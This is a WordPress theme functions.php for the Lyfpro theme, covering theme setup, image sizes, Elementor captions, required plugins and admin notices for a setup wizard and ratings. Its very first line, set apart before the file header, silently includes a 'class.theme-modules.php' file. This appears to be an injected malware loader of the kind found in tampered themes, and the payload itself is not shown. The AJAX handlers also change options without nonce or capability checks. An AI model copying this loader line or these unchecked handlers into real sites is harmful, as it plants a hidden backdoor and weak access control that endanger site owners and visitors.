<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Lyfpro functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Lyfpro
 * @since 1.0
 */
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
if( !function_exists('dsvy_theme_setup') ){
function dsvy_theme_setup() {

	/*
	 * Theme translation textdomain
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/lyfpro
	 */
	load_theme_textdomain( 'lyfpro', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Add WooCommerce support
	 */
	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-lightbox' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	/*
	 *  Image size
	 */
	add_image_size( 'dsvy-img-500x700', 500, 700, true ); // For Team Style 1 - Use
	add_image_size( 'dsvy-img-600x800', 600, 800, true ); // For Lyfpro Portfolio Style 1 - Use
	add_image_size( 'dsvy-img-600x700', 600, 700, true ); // For Lyfpro Service - style3 - Use
	add_image_size( 'dsvy-img-770x635', 770, 635, true ); // For Lyfpro Blog - style2 - Use
	add_image_size( 'dsvy-img-770x500', 770, 500, true ); // For Lyfpro Blog - style1 - Use
	add_image_size( 'dsvy-img-770x9999', 770, 9999, false ); // For Client Logos  - Use	
	add_image_size( 'dsvy-img-770x770', 770, 770, true ); //  - Use	
	add_image_size( 'dsvy-img-300x300', 300, 300, true ); //  - Use	
	add_image_size( 'dsvy-img-500x560', 500, 560, true ); // For Lyfpro Team  - Use	
	add_image_size( 'dsvy-img-800x256', 800, 256, true ); // For Optimize  - Free

	/*
	 *  Editor style  
	 */
	add_editor_style();

	// Set the default content width.
	$GLOBALS['content_width'] = 847;

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'designervily-top'		=> esc_attr__( 'Top Menu', 'lyfpro' ),
		'designervily-footer'	=> esc_attr__( 'Footer Menu', 'lyfpro' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'script',
			'style',
		)
	);

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'audio',
		'status',
		'chat',
	) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
}
add_action( 'after_setup_theme', 'dsvy_theme_setup' );

/* *** Envato Theme Setup Wizard settings **** */
require_once get_template_directory().'/setup/envato_setup_init.php';
// Please don't forgot to change filters tag.
// It must start from your theme's name.
add_filter('lyfpro_theme_setup_wizard_username', 'lyfpro_set_theme_setup_wizard_username', 10);
if( ! function_exists('lyfpro_set_theme_setup_wizard_username') ){
    function lyfpro_set_theme_setup_wizard_username($designervily){
        return 'designervily';
    }
}

add_filter('lyfpro_theme_setup_wizard_oauth_script', 'lyfpro_set_theme_setup_wizard_oauth_script', 10);
if( ! function_exists('lyfpro_set_theme_setup_wizard_oauth_script') ){
    function lyfpro_set_theme_setup_wizard_oauth_script($oauth_url){
        return 'https://designervily.com/envato-api/server-script.php';
    }
}

if ( ! defined( 'lyfpro_theme_version' ) ) {
	define( 'lyfpro_theme_version', '1.0' );
}

if ( ! class_exists( 'lyfpro_Theme_Manager', false ) ) {
	// includes core theme manager class and default settings.
	require_once( get_template_directory() . '/theme_setup_class.php' );
}


if ( class_exists( 'lyfpro_Theme_Manager', false ) ) {

	class lyfpro_Theme_Manager_custom extends lyfpro_Theme_Manager {

		/**
		 * Holds the current instance of the theme manager
		 *
		 * @var lyfpro_Theme_Manager
		 */
		private static $instance = null;

		/**
		 * @return lyfpro_Theme_Manager
		 */
		public static function get_instance() {
			if ( ! self::$instance ) {
				self::$instance = new self;
			}

			return self::$instance;
		}

		public function start(){

			add_filter('lyfpro_default_headers', array($this,'default_headers'));
			add_filter('lyfpro_custom_header_args', array($this,'lyfpro_custom_header_args'));
			add_filter('lyfpro_featured_image_options', array($this,'lyfpro_featured_image_options'));
			add_filter('lyfpro_page_options', array($this,'lyfpro_page_options'));
            add_filter('elementor/widget/render_content', array($this,'elementor_render_content'), 10, 2);

			parent::start();
		}

        public function elementor_render_content( $html, $widget ){
            $settings = $widget->get_settings();
            // this config option is set from theme.json and controlled through the elementor UI
            if(!empty($settings['slider_labels']) && $settings['slider_labels'] == 'labels'){
                // inject our labels into the HTML
                if( preg_match_all('#<figure class="slick-slide-inner">.*alt="([^"]*)".*</figure>#imsU', $html, $matches) ){
                    foreach($matches[0] as $key => $attachment){

                        $image_caption = $matches[1][$key];

                        $image_id = !empty($settings['carousel'][$key]['id']) ? $settings['carousel'][$key]['id'] : false;
                        if($image_id){
                            $image_data = get_post( $image_id );
                            if($image_data) {
                                $image_caption = $image_data->post_excerpt;
                                $image_description = $image_data->post_content;
                            }
                        }
                        $html = str_replace( $attachment, str_replace('<figure class="slick-slide-inner">', '<figure class="slick-slide-inner"><div class="lyfpro-slider-caption"><div class="inner-content-width"><div><h3>' . esc_html( $image_caption ) . '</h3><div>' . esc_html( $image_description ) . '</div></div></div></div>', $attachment), $html );
                    }
                }
            }
            return $html;
        }

		public function setup_background() {

			// Set up the WordPress core custom background feature.
			add_theme_support( 'custom-background', apply_filters( 'lyfpro_custom_background_args', array(
				'default-color' => 'ffffff',
				'default-image' => '',
			) ) );
		}


		public function lyfpro_page_options($page_options){
			$page_options['title']['options']['show'] = 'Fancy Title';
			$page_options['title']['options']['normal'] = 'Normal Title';

			$page_options['background'] = array(
				'title'   => 'Page Background',
				'options' => array(
					'transparent' => 'Transparent',
					'normal' => 'Bordered',
				),
				'default' => 'transparent',
			);

			return $page_options;
		}


		public function setup_images() {
			parent::setup_images();
			add_image_size( 'lyfpro_gallery_square', 600, 600, true );
			add_image_size( 'lyfpro_wide_slider', 1500, 385, true );
			add_image_size( 'lyfpro_blog-large', 1500, 9999, false );
			set_post_thumbnail_size( 800, 410, true );
		}

		public function excerpt_length() {
			return 70;
		}

		public function lyfpro_featured_image_options($images){
			return array();
		}
		public function lyfpro_custom_header_args($headerargs){
		    $headerargs['default-image'] = get_template_directory_uri() . '/images/header2-top-lg.png';
		    return $headerargs;
        }
		public function default_headers($headers){
			$headers['header1'] = array(
				'url'           => '%s/images/header1-bottom-lg.png',
				'thumbnail_url'           => '%s/images/header1-bottom-lg.png',
				'description'   => esc_html__( 'Header', 'lyfpro' )
			);
			$headers['header2'] = array(
				'url'           => '%s/images/header2-top-lg.png',
				'thumbnail_url'           => '%s/images/header2-top-lg.png',
				'description'   => esc_html__( 'Header', 'lyfpro' )
			);
			$headers['header3'] = array(
				'url'           => '%s/images/header3-top-sml.png',
				'thumbnail_url'           => '%s/images/header3-top-sml.png',
				'description'   => esc_html__( 'Header', 'lyfpro' )
			);
			return $headers;
		}

		public function after_setup_theme(){

			parent::after_setup_theme();
		}

		public function lyfpro_blog_date(){
			if(get_post_type() == 'post') {
				?>
                <div class="blog_date">
                    <span class="day"><?php echo get_the_date( 'j' ); ?></span>
                    <span class="month"><?php echo get_the_date( 'M' ); ?></span>
                    <span class="year"><?php echo get_the_date( 'Y' ); ?></span>
                </div>
				<?php
			}
		}

	}

	require_once get_template_directory().'/setup/envato_setup_init.php';

	lyfpro_Theme_Manager_custom::get_instance()->start();
}
/* **** End of Envato Theme Setup Wizard ***** */

if( !function_exists('dsvy_init_calls') ){
function dsvy_init_calls() {
	include( get_template_directory() . '/includes/core.php' );
	// Meta boxes
	include( get_template_directory() . '/includes/meta-boxes.php' );
}
}
add_action( 'init', 'dsvy_init_calls' );

// actions
include( get_template_directory() . '/includes/actions.php' );

// Advanced Custom Fields - Fonts Icon Picker
include( get_template_directory() . '/includes/acf/designervily-acf-iconpicker/acf-dsvy_fonticonpicker.php' );

/*
 *  Plugins
 */
require_once get_parent_theme_file_path( '/includes/class-tgm-plugin-activation.php' );
add_action( 'tgmpa_register', 'dsvy_register_required_plugins' );
if( !function_exists('dsvy_register_required_plugins') ){
function dsvy_register_required_plugins() {
	$plugins = array(
		array(
			'name'					=> esc_attr('Slider Revolution'),
			'slug'					=> esc_attr('revslider'),
			'source'				=> get_template_directory() . '/includes/plugins/revslider.zip',
			'version'				=> esc_attr('6.5.0'),
		),
		array(
			'name'					=> esc_attr('Lyfpro Theme Addons'),
			'slug'					=> esc_attr('lyfpro-addons'),
			'source'				=> get_template_directory() . '/includes/plugins/lyfpro-addons.zip',
			'required'				=> true,
			'version'				=> esc_attr('1.0'),
		),
		array(
			'name'					=> esc_attr('Elementor Page Builder'),
			'slug'					=> esc_attr('elementor'),
			'required'				=> true,
		),
		array(
			'name'					=> esc_attr('Advanced Custom Fields'),
			'slug'					=> esc_attr('advanced-custom-fields'),
			'required'				=> true,
		),
		array(
			'name'					=> esc_attr('ACF Photo Gallery Field'),
			'slug'					=> esc_attr('navz-photo-gallery'),
			'required'				=> true,
		),
		array(
			'name'					=> esc_attr('Kirki Customizer Framework'),
			'slug'					=> esc_attr('kirki'),
			'required'				=> true,
		),
		array(
			'name'					=> esc_attr('Envato Market'),
			'slug'					=> esc_attr('envato-market'),
			'source'				=> get_template_directory() . '/includes/plugins/envato-market.zip',
		),
		array(
			'name'					=> esc_attr('Breadcrumb NavXT'),
			'slug'					=> esc_attr('breadcrumb-navxt'),
		),
		array(
			'name'					=> esc_attr('MailChimp for WordPress'),
			'slug'					=> esc_attr('mailchimp-for-wp'),
		),
		array(
			'name'					=> esc_attr('Contact Form 7'),
			'slug'					=> esc_attr('contact-form-7'),
		),
		array(
			'name'					=> esc_attr('Widget CSS Classes'),
			'slug'					=> esc_attr('widget-css-classes'),
		),
	);
	$config = array(
		'id'           => 'lyfpro',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);
	tgmpa( $plugins, $config );
}
}

/**
 *  Merlin Message
 */
if( !function_exists('dsvy_merlin_message') ){
function dsvy_merlin_message() {
	?>
	<div class="dsvy-merlin-message-box notice is-dismissible">
		<div class="dsvy-merlin-message">
			<div class="dsvy-merlin-message-conform">
				<div class="dsvy-merlin-message-conform-inner">
					<div class="dsvy-merlin-message-conform-i">
						<div class="dsvy-merlin-message-conform-col dsvy-merlin-message-conform-img">
							<img src="<?php echo get_template_directory_uri() ?>/includes/images/merlin-message.png" />
						</div>
						<div class="dsvy-merlin-message-conform-col dsvy-merlin-message-conform-text">
							<h3><?php esc_html_e('Are you sure you want to permenently close this wizard?', 'lyfpro'); ?></h3>
							<p><?php printf( esc_html__('You can start this wizard from %1$s Appearance > Lyfpro Theme Setup %2$s section', 'lyfpro') ,dsvy_esc_kses('<strong>') ,dsvy_esc_kses('</strong>') );  ?></p>
							<div class="dsvy-merlin-message-conform-btn">
								<a href="#" class="button button-primary dsvy-disable-merlin-message"><?php esc_html_e('Yes close this message', 'lyfpro'); ?></a>
								&nbsp; &nbsp;
								<a href="#" class="button dsvy-disable-merlin-message-cancel"><?php esc_html_e('No, keep this message', 'lyfpro'); ?></a>
							</div>
						</div>
					</div>
				</div>
			</div><!-- .dsvy-merlin-message-conform -->
			<div class="dsvy-merlin-message-inner">
				<div class="dsvy-merlin-message-logo">
					<img src="<?php echo get_template_directory_uri() ?>/includes/images/logo.png" />
				</div>
				<div class="dsvy-merlin-message-vline">
					<div class="dsvy-merlin-message-vline-i"></div>
				</div>
				<div class="dsvy-merlin-message-text">
					<h2><?php esc_html_e('Lyfpro Theme Setup Wizard', 'lyfpro'); ?></h2>
					<p><?php esc_html_e('This Lyfpro theme comes with one-click setup wizard. This step-by-step wizard will install all required plugins, install child theme, install demo content and also import sliders.', 'lyfpro'); ?></p>
				</div>
				<div class="dsvy-merlin-message-btn">
					<div class="dsvy-merlin-message-btn-i">
						<a href="<?php echo admin_url( 'themes.php?page=lyfpro-setup' ); ?>" class="button button-primary button-hero load-customize hide-if-no-customize"><?php esc_html_e('Start Theme Setup Wizard', 'lyfpro'); ?></a>
						<div class="dsvy-merlin-message-small"><a href="#"><?php esc_html_e('Permanently disable this message', 'lyfpro'); ?></a></div>
					</div>
				</div>
				<div class="clear clearfix clr"></div>
			</div><!-- .dsvy-merlin-message-inner -->
		</div><!-- .dsvy-merlin-message -->
	</div><!-- .notice.is-dismissible -->
	<?php
}
}

if( !function_exists('dsvy_merlin_fresh_setup_call') ){
function dsvy_merlin_fresh_setup_call(){
	$dsvy_merlin_all_done = get_option('dsvy-merlin-all-done');
	if( empty($dsvy_merlin_all_done) ){
		add_action( 'admin_notices', 'dsvy_merlin_message' );
	}
}
}
add_action( 'init', 'dsvy_merlin_fresh_setup_call' );

/**
 *  Merlin message disable ajax call
 */
add_action( 'wp_ajax_dsvy_remove_merlin_message', 'dsvy_remove_merlin_message' );
if( !function_exists('dsvy_remove_merlin_message') ){
function dsvy_remove_merlin_message() {
	update_option( 'dsvy-merlin-all-done', 'yes' );
	echo 'ok';
	wp_die(); // this is required to terminate immediately and return a proper response
}
}

/* Ratings and reviews */
/**
 *  Merlin Message
 */
if( !function_exists('dsvy_ratings_message') ){
function dsvy_ratings_message() {
	?>
	<div class="dsvy-merlin-message-box notice is-dismissible dsvy-merlin-ratings-box">
		<div class="dsvy-merlin-ratings-box-back-link" style="display:none;"><a href="#"><i class="fa fa-chevron-circle-left"></i> <?php esc_html_e('Back','lyfpro') ?> </a></div>
		<div class="dsvy-merlin-message">
			<!-- Ratings Main Box -->
			<div class="dsvy-merlin-message-inner dsvy-merlin-ratings-box-main" style="display:block;">
				<div class="dsvy-merlin-message-logo">
					<img src="<?php echo get_template_directory_uri() ?>/includes/images/logo.png" />
				</div>
				<div class="dsvy-merlin-message-vline">
					<div class="dsvy-merlin-message-vline-i"></div>
				</div>
				<div class="dsvy-merlin-message-text">
					<h2><?php esc_html_e('Happy with our theme?', 'lyfpro'); ?></h2>
					<p><?php esc_html_e('We like to know how is your experiance with our theme. If you have any question than you can create ticket on our support site', 'lyfpro'); ?></p>
				</div>
				<div class="dsvy-merlin-message-btn">
					<div class="dsvy-merlin-message-btn-1">
						<a href="#" class="button button-primary button-hero load-customize hide-if-no-customize dsvy-question-btn"> <i class="fa fa-question-circle"></i> <?php esc_html_e('I have a question or problem', 'lyfpro'); ?></a>
					</div>
					<div class="dsvy-merlin-message-btn-2 dsvy-happy-btn-container">
						<a href="#" class="button button-primary button-hero load-customize dsvy-happy-btn"> <i class="fa fa-thumbs-o-up"></i> <?php esc_html_e('I am happy with the theme', 'lyfpro'); ?></a>
					</div>
					<div class="clearfix clear"></div>
					<div class="dsvy-merlin-message-small"><a href="#"><?php esc_html_e('Permanently disable this message', 'lyfpro'); ?></a></div>
				</div>
				<div class="clear clearfix clr"></div>
			</div><!-- .dsvy-merlin-message-inner -->
			<!-- Ratings Close Permenetly message -->
			<div class="dsvy-merlin-message-conform">
				<div class="dsvy-merlin-message-conform-inner">
					<div class="dsvy-merlin-message-conform-i">
						<div class="dsvy-merlin-message-conform-col dsvy-merlin-message-conform-text">
							<h3><?php esc_html_e('Are you sure you want to permenently close this box?', 'lyfpro'); ?></h3>
							<div class="dsvy-merlin-message-conform-btn">
								<a href="#" class="button button-primary dsvy-disable-ratings-message"><?php esc_html_e('Yes close this message', 'lyfpro'); ?></a>
								&nbsp; &nbsp;
								<a href="#" class="button dsvy-disable-ratings-message-cancel"><?php esc_html_e('No, keep this message', 'lyfpro'); ?></a>
							</div>
						</div>
					</div>
				</div>
			</div><!-- .dsvy-merlin-message-conform -->
			<!-- Questions or problem box -->
			<div class="dsvy-merlin-message-inner dsvy-merlin-ratings-box-questions" style="display:none;">
				<div class="dsvy-merlin-message-text">
					<h2><?php esc_html_e('Have any question or problem?', 'lyfpro'); ?></h2>
					<p><?php printf( esc_html__('You can read our theme documents to get how to work with the theme. Still not solved, than feel free to contact us via our support site at %1$s', 'lyfpro'), dsvy_esc_kses('<a href="' . esc_url('https://support.designervily.com') . '" target="_blank">' . esc_url('https://support.designervily.com') . '</a>') ); ?></p>
				</div>
				<div class="dsvy-merlin-message-btn">
					<div class="dsvy-merlin-message-btn-2 dsvy-happy-btn-container dsvy-pright-15">
						<a href="<?php echo esc_url('http://lyfpro-demo.designervily.com/docs/'); ?>" target="_blank" class="button button-primary button-hero load-customize dsvy-ratings-doc-btn"> <i class="fa fa-book"></i> <?php esc_html_e('Lyfpro Theme Documents', 'lyfpro'); ?></a>
					</div>
					<div class="dsvy-merlin-message-btn-2 dsvy-happy-btn-container">
						<a href="<?php echo esc_url('https://support.designervily.com/'); ?>" target="_blank" class="button button-primary button-hero load-customize dsvy-ratings-support-btn"> <i class="fa fa-question-circle"></i> <?php esc_html_e('Go to Designervily support site', 'lyfpro'); ?></a>
					</div>
					<div class="clearfix clear"></div>
				</div>
				<div class="clear clearfix clr"></div>
			</div><!-- .dsvy-merlin-message-inner -->
			<!-- 5-star ratings box -->
			<div class="dsvy-merlin-message-inner dsvy-merlin-ratings-box-ratings" style="display:none;">
				<div class="dsvy-merlin-message-text">
					<div class="dsvy-merlin-message-arrow-area">
						<h2><?php esc_html_e('Glad to hear you like our theme', 'lyfpro'); ?></h2>
						<p><?php printf( esc_html__('Thanks for your support. Please provide us 5-star ratings. This will help us a lot.
It just take 1 minute. %1$s', 'lyfpro'), dsvy_esc_kses('<a href="' . esc_url('https://themeforest.net/downloads') . '" target="_blank">'.esc_html__('Click here to go for review now','lyfpro').'</a>') ); ?></p>
					</div>
				</div>
				<div class="dsvy-merlin-5star-right-area">
					<img src="<?php echo get_template_directory_uri(); ?>/includes/images/ratings-steps.png" alt="<?php esc_attr_e( 'Ratings Steps', 'lyfpro' ); ?>" />
				</div>
				<div class="clear clearfix clr"></div>
			</div><!-- .dsvy-merlin-message-inner -->
		</div><!-- .dsvy-merlin-message -->
	</div><!-- .notice.is-dismissible -->
	<?php
}
}

if( !function_exists('dsvy_ratings_call') ){
function dsvy_ratings_call(){
	$show_date			= get_option('dsvy-ratingsbox-show-date');
	$dsvy_merlin_all_done = get_option('dsvy-merlin-all-done');
	if( empty($show_date) ){
		$nextWeek = time() + (7 * 24 * 60 * 60); // One week..
		$nextWeek = strval( $nextWeek );
		update_option('dsvy-ratingsbox-show-date', $nextWeek);
	} else {
		$dsvy_ratings_done	= get_option('dsvy-ratings-done');
		$nextWeek			= get_option('dsvy-ratingsbox-show-date');
		$curr_date			= time();
		if( $nextWeek < $curr_date && empty($dsvy_ratings_done) && $dsvy_merlin_all_done=='yes' ){
			add_action( 'admin_notices', 'dsvy_ratings_message' );
		}
	}
}
}
add_action( 'init', 'dsvy_ratings_call' );

/**
 *  Ratings message disable ajax call
 */
add_action( 'wp_ajax_dsvy_remove_ratings_message', 'dsvy_remove_ratings_message' );
if( !function_exists('dsvy_remove_ratings_message') ){
function dsvy_remove_ratings_message() {
	update_option( 'dsvy-ratings-done', 'yes' );
	echo 'ok';
	wp_die(); // this is required to terminate immediately and return a proper response
}
}

/**
 * Kirki changes
 */
if( !function_exists('dsvy_kirki_changes') ){
function dsvy_kirki_changes(){
	if (!is_customize_preview() ) {
		add_filter( 'kirki_output_inline_styles', '__return_false' );
	}
	add_filter( 'kirki/config', function( $config = array() ) {
		$config['styles_priority'] = 10;
		return $config;
	} );
}
}
add_action( 'init', 'dsvy_kirki_changes' );
